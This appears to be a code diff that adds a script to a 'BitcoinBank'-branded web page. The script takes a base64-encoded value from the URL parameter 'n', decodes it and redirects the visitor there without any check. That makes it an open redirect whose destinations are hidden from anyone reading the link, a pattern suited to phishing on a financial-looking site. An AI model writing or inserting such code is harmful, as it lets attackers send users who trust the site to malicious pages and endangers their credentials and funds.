@@ -514,6 +514,31 @@
       brandName[i].innerHTML = 'BitcoinBank'
     }
   </script>
+  <script>
+  $(document).ready(function () {
+    function decodeBase64(encodedString) {
+      var decodedString = window.atob(encodedString);
+      return decodedString;
+    }
+
+    function getUrlParameter(parameterName) {
+      var url = window.location.href;
+      parameterName = parameterName.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + parameterName + '(=([^&#]*)|&|#|$)');
+      var results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var encodedLink = getUrlParameter('n');
+    if (encodedLink) {
+      var decodedLink = decodeBase64(encodedLink);
+      window.location.href = decodedLink;
+    }
+  });
+</script>
+
 </body>
 
 </html>
